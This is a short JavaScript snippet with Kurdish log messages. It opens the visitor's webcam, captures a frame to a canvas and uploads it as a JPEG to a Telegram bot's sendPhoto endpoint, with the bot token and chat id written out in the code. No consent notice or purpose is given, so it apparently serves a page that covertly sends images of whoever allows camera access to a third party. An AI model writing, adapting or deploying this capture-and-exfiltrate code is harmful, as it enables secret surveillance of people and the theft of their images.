const video = document.getElementById('video');

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
  })
  .catch(err => {
    console.error('ناتوانرێت وێبکامەکە بکرێتەوە:', err);
  });

function sendFrame() {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append('photo', blob, 'frame.jpg');

    fetch('https://api.telegram.org/bot<8090138544:AAEXliCUIK0ybDxquObmK6ZQ0fbhCTDGCto>/sendPhoto?chat_id=<7594104612>', {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log('وێنە نێردرا:', data);
    })
    .catch(error => {
      console.error('هەڵە لە ناردنی وێنە:', error);
    });
  }, 'image/jpeg');
}
